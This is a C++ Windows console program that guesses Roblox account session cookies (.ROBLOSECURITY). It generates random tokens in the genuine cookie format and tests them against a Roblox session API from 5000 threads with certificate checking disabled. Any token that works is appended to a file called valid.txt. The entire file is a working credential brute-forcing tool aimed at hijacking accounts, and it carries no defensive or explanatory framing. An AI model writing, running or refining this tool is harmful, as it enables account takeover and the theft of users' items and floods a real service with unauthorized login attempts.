#include <iostream>
#include <string>
#include <random>
#include <windows.h>
#include <thread>
#include <mutex>
#include <fstream>
#include <curl/curl.h>
#include <conio.h>
#include <chrono>
#include <cctype>

std::mutex mtx;
int valid = 0, invalid = 0;
constexpr int threadsCount = 5000;
int columns = 140;
const std::string RESET    = "\033[0m";
const std::string BLUE     = "\033[34m";
const std::string GREEN    = "\033[32m";
const std::string DARKRED  = "\033[38;5;124m";
const std::string ORANGE   = "\033[38;5;208m";

void updateTitle() {
    const std::string title = "invalid - " + std::to_string(invalid)
                      + " | valid - " + std::to_string(valid);
    SetConsoleTitleA(title.c_str());
}

void updateTitleWorker() {
    while (!_kbhit()) {
        {
            std::lock_guard lock(mtx);
            updateTitle();
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

std::string generateToken() {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    std::string token = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, static_cast<int>(chars.size() - 1));
    for (int i = 0; i < 1356; ++i)
        token += chars[distrib(gen)];
    return token;
}

size_t writeCallback(const char* ptr, const size_t size, size_t nmemb, void* userdata) {
    auto* response = static_cast<std::string*>(userdata);
    response->append(ptr, size * nmemb);
    return size * nmemb;
}

void printHexColor(const std::string& hex) {
    std::cout << BLUE;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::cout << hex.substr(i, 2) << " ";
        if ((i / 2 + 1) % columns == 0)
            std::cout << "\n";
    }
    std::cout << RESET << std::endl;
}

void checkToken(const std::string& token, int threadId) {
    if (CURL* curl = curl_easy_init()) {
        std::string response;
        curl_slist* headers = nullptr;
        const std::string cookieHeader = "Cookie: .ROBLOSECURITY=" + token;
        headers = curl_slist_append(headers, cookieHeader.c_str());
        curl_easy_setopt(curl, CURLOPT_URL, "https://apis.roblox.com/token-metadata-service/v1/sessions");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER , 0);
        const CURLcode res = curl_easy_perform(curl);

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

        const std::string tokenHash = token.substr(116);

        {
            std::lock_guard lock(mtx);
            if (res == CURLE_OK && response.find("sessions") != std::string::npos) {
                valid++;
                std::ofstream validFile("valid.txt", std::ios::app);
                validFile << token << std::endl;
                std::cout << GREEN << "[VALID]" << RESET << " - "
                          << ORANGE << "Status Code:" << RESET << " "
                          << BLUE << http_code << RESET << std::endl;
                printHexColor(tokenHash);
            } else {
                invalid++;
                if (threadId % 25 == 0) {
                    std::cout << DARKRED << "[INVALID]" << RESET << " - "
                              << ORANGE << "Status Code:" << RESET << " "
                              << BLUE << http_code << RESET << std::endl;
                }
            }
            updateTitle();
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

[[noreturn]] void startCheck(const int threadId) {
    while (true) {
        std::string token = generateToken();
        checkToken(token, threadId);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

[[noreturn]] int main() {
    SetConsoleOutputCP(CP_UTF8);
    system("mode con: cols=213 lines=50");
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "Starting token checks..." << std::endl;

    std::thread titleThread(updateTitleWorker);
    titleThread.detach();

    for (int i = 0; i < threadsCount; ++i) {
        std::thread(startCheck, i).detach();
    }

    while (true) {
        Sleep(1000);
    }
}
